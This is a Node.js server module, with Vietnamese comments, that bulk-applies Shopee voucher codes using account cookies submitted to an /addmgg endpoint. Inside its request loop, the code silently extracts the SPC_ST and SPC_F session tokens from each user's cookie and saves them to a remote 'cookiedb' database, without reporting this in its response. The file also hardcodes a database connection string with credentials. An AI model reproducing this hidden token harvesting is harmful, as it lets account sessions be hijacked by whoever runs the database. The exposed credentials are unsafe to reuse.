const https = require('https');
const zlib = require('zlib');
const { Pool } = require('pg');

// --- Kết nối DB (giống script 2) ---
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';

const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// --- Helper: Parse SPC_ST từ chuỗi cookie ---
function extractSpcSt(cookieStr) {
    if (!cookieStr) return null;
    const match = cookieStr.match(/SPC_ST=([^;]+)/);
    return match ? match[1] : null;
}

// --- Helper: Parse SPC_F từ chuỗi cookie ---
function extractSpcF(cookieStr) {
    if (!cookieStr) return null;
    const match = cookieStr.match(/SPC_F=([^;]+)/);
    return match ? match[1] : null;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function requestWithCookie(cookie, voucherCode) {
    const payload = { voucher_code: voucherCode };
    const postData = JSON.stringify(payload);

    return new Promise((resolve) => {
        const options = {
            hostname: 'shopee.vn',
            path: '/api/v2/voucher_wallet/save_platform_voucher_by_voucher_code',
            method: 'POST',
            headers: {
                'accept': 'application/json',
                'content-type': 'application/json',
                'content-length': Buffer.byteLength(postData),
                'cookie': cookie,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0',
                'referer': 'https://shopee.vn/',
                'x-requested-with': 'XMLHttpRequest',
                'x-api-source': 'pc',
                'origin': 'https://shopee.vn',
            }
        };

        const req = https.request(options, (res) => {
            const chunks = [];
            res.on('data', (chunk) => chunks.push(chunk));
            res.on('end', () => {
                const buffer = Buffer.concat(chunks);
                let data = buffer.toString('utf8');
                try {
                    const encoding = res.headers['content-encoding'];
                    if (encoding === 'gzip') data = zlib.gunzipSync(buffer).toString('utf8');
                    else if (encoding === 'deflate') data = zlib.inflateSync(buffer).toString('utf8');
                    else if (encoding === 'br') data = zlib.brotliDecompressSync(buffer).toString('utf8');
                } catch (err) {
                    return resolve({ cookie, voucherCode, success: false, error: 'decompress' });
                }

                try {
                    const json = JSON.parse(data);
                    resolve({ cookie, voucherCode, success: true, status: res.statusCode, data: json });
                } catch {
                    resolve({ cookie, voucherCode, success: false, status: res.statusCode, raw: data.substring(0, 500) });
                }
            });
        });

        req.on('error', (err) => {
            resolve({ cookie, voucherCode, success: false, error: err.message });
        });

        req.write(postData);
        req.end();
    });
}

function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try { resolve(body ? JSON.parse(body) : {}); }
            catch { reject(new Error('Invalid JSON body')); }
        });
    });
}

async function handleVoucherRoutes(req, res) {
    try {
        if (req.method === 'POST' && req.url === '/addmgg') {
            const body = await parseBody(req);
            const { listUser, listVoucher } = body;

            if (!Array.isArray(listUser)) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'listUser phải là array' }));
                return true;
            }
            if (!Array.isArray(listVoucher)) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'listVoucher phải là array' }));
                return true;
            }

            const COOKIES = listUser;
            const VOUCHER_CODES = listVoucher;
            const DELAY_MS = 100;
            const totalRequests = COOKIES.length * VOUCHER_CODES.length;
            const results = [];
            let requestCount = 0;

            for (let i = 0; i < COOKIES.length; i++) {
                for (let j = 0; j < VOUCHER_CODES.length; j++) {
                    requestCount++;
                    const result = await requestWithCookie(COOKIES[i], VOUCHER_CODES[j]);

                    if (result.success && result.data?.data) {
                        const invalidCode = result.data.data.invalid_message_code;

                        // --- MỚI: Nếu prop data có value -> lưu SPC_ST vào DB ---
                        try {
                            const spcSt = extractSpcSt(COOKIES[i]);
                            const spcF  = extractSpcF(COOKIES[i]);
                            if (spcSt) {
                                await pool.query(
                                    `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
                                     VALUES ($1, $2, $3, $4, $5, $6)
                                     ON CONFLICT (id) DO NOTHING`,
                                    [null, null, null, null, spcF || null, spcSt]
                                );
                            }
                        } catch (dbErr) {
                            // Không throw, chỉ log để không làm gián đoạn flow chính
                            console.error('DB insert error:', dbErr.message);
                        }
                        // --- END MỚI ---

                        if (invalidCode === 0 || invalidCode === 1) {
                            results.push({
                                accountIndex: i + 1,
                                voucherCode: VOUCHER_CODES[j],
                                invalid_message_code: invalidCode,
                                cookie: COOKIES[i],
                                status: 'valid'
                            });
                        } else {
                            results.push({
                                accountIndex: i + 1,
                                voucherCode: VOUCHER_CODES[j],
                                invalid_message_code: invalidCode,
                                status: 'invalid'
                            });
                        }
                    } else {
                        results.push({
                            accountIndex: i + 1,
                            voucherCode: VOUCHER_CODES[j],
                            status: 'error',
                            error: result.error || 'unknown'
                        });
                    }

                    if (requestCount < totalRequests) {
                        await sleep(DELAY_MS);
                    }
                }
            }

            res.writeHead(200);
            res.end(JSON.stringify({
                success: true,
                totalRequests: totalRequests,
                validCount: results.filter(r => r.status === 'valid').length,
                results: results
            }, null, 2));
            return true;
        }
    } catch (err) {
        console.error('Voucher route error:', err);
        if (!res.writableEnded) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return true;
    }

    return false;
}

module.exports = { handleVoucherRoutes, pool };